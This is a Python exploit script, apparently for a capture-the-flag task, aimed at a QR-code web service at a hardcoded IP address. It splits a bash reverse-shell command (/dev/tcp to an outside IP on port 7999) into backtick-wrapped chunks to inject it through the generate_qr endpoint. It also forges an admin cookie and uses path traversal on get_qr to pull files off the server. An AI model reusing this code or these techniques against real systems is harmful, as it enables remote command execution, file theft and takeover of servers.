import requests

HOST = "http://51.250.81.57:40006/"
LINK = HOST + 'generate_qr'
source = '../../../../../../../../tmp/a'
COMMAND = '/bin/bash -c "bash -i >& /dev/tcp/192.248.182.81/7999 0>&1"'
# endings = ['m']
endings = None
responce_500 = '''<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
'''
COOKIES = {'admin': 'true'}


# split string in to the substrings of fixed length
def chunkstring(string, length) -> list[str]:
    return [string[0+i:length+i] for i in range(0, len(string), length)]


# hide payload command into the bash staff (used in particular task)
def bash_list(command: str) -> list[str]:
    ans = []
    chunks = chunkstring(command, 4)
    for sub_str in chunks:
        sub_ans = ''
        if sub_str == chunks[0]:
            sub_ans += ';'
        else:
            sub_ans += '`'
        sub_ans += sub_str
        if sub_str != chunks[-1]:
            sub_ans += '`#'
        ans.append(sub_ans)
    return ans

# using vulnerabilty to get file via it's name


def do_request(src: str) -> bool:
    r = requests.get(
        f'{HOST}get_qr?uname={src}', cookies=COOKIES)
    print(r.text)
    # responce_500 when file is not accesseble or it is a dir
    if r.text != responce_500:
        with open(src, 'wb') as f:
            f.write(r.content)
            return True
    return False


# _ = [';ls`#', '`>`#', '`/tmp`#', '`/a']
def do_payload():
    # payload
    our_json = bash_list(COMMAND)
    print(our_json)
    # use vulnerability to execute payload on server
    r = requests.post(LINK, json=our_json)
    print(r.text)


def do_parse():
    if endings:
        for end in endings:
            print(f'try:{end}')
            src = source+end
            do_request(src)

    else:
        print(f'try:{source}')
        do_request(source)


if __name__ == "__main__":
    print("".join(bash_list(COMMAND)))
    # do_payload()
    # do_parse()
